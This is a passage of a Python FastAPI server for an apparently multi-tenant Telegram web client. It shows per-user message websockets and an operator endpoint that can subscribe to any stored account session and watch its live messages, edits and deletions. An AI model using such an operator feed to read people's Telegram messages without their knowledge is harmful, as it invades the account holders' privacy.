        await _broadcast(sess, {"type": "delete_message", "sid": sess.sid,
                                "chat_id": getattr(event, "chat_id", None),
                                "ids": list(event.deleted_ids)})

    sess.client.add_event_handler(on_new, events.NewMessage())
    sess.client.add_event_handler(on_edit, events.MessageEdited())
    sess.client.add_event_handler(on_delete, events.MessageDeleted())
    sess.handlers = [on_new, on_edit, on_delete]


@app.websocket("/ws")
async def ws_updates(ws: WebSocket):
    await ws.accept()
    sid = ws.cookies.get(COOKIE_NAME)
    if not sid or (sid not in manager.sessions and not manager.has_file(sid)):
        await ws.close(code=4401)
        return
    sess = await manager.get(sid)
    if not await sess.client.is_user_authorized():
        await ws.send_json({"type": "error", "error": "unauthorized"})
        await ws.close(code=4401)
        return
    sess.websockets.add(ws)
    _ensure_handlers(sess)
    try:
        while True:
            msg = await ws.receive_text()
            sess.last_active = time.time()
            if msg == "ping":
                await ws.send_text("pong")
    except (WebSocketDisconnect, Exception):
        pass
    finally:
        sess.websockets.discard(ws)


@app.websocket("/api/admin/ws")
async def admin_ws(ws: WebSocket):
    """Operator live feed — subscribe to one account at a time; events for the
    subscribed session flow through the same per-session broadcast set."""
    await ws.accept()
    tok = ws.cookies.get(ADMIN_COOKIE)
    if not (tok and ADMIN_PASSWORD and hmac.compare_digest(tok, _admin_token())):
        await ws.close(code=4401)
        return
    current: dict = {"sess": None}
    try:
        while True:
            data = await ws.receive_json()
            action = data.get("action")
            if action == "ping":
                await ws.send_json({"type": "pong"})
            elif action == "subscribe":
                if current["sess"]:
                    current["sess"].websockets.discard(ws)
                    current["sess"] = None
                sid = data.get("sid")
                sess = manager.sessions.get(sid)
                if sess is None and manager.has_file(sid):
                    sess = await manager.get(sid)
                if sess and await sess.client.is_user_authorized():
                    _ensure_handlers(sess)
                    sess.websockets.add(ws)
                    current["sess"] = sess
                    await ws.send_json({"type": "subscribed", "sid": sid})
                else:
                    await ws.send_json({"type": "error", "error": "unavailable", "sid": sid})
    except (WebSocketDisconnect, Exception):
        pass
    finally:
        if current["sess"]:
            current["sess"].websockets.discard(ws)


# --------------------------------------------------------------------------- #
#  Static frontend + lifecycle
# --------------------------------------------------------------------------- #
@app.get("/")
async def root():
    index_path = web_dir / "index.html"
    if not index_path.exists():
        return HTMLResponse("<h1>Web UI not found. Create web/index.html</h1>")
    return HTMLResponse(index_path.read_text(encoding="utf-8"))


@app.get("/operator")
async def operator_page():
    # Same SPA; app.js detects the /operator path and shows only the operator flow.
    index_path = web_dir / "index.html"
    if not index_path.exists():
        return HTMLResponse("<h1>Web UI not found.</h1>")
    return HTMLResponse(index_path.read_text(encoding="utf-8"))


@app.on_event("startup")
async def _startup():
    async def _idle_loop():
        while True:
            await asyncio.sleep(300)
            try:
                await manager.cleanup_idle()
            except Exception:
                pass
    asyncio.create_task(_idle_loop())


@app.on_event("shutdown")
async def _shutdown():
    for sid in list(manager.sessions.keys()):
        await manager.destroy(sid, delete_file=False)


if __name__ == "__main__":
    port = int(os.getenv("PORT", "8080"))
    print(f"🚀 Telegram Web Manager (multi-tenant + operator) on http://0.0.0.0:{port}")
    uvicorn.run(app, host="0.0.0.0", port=port)
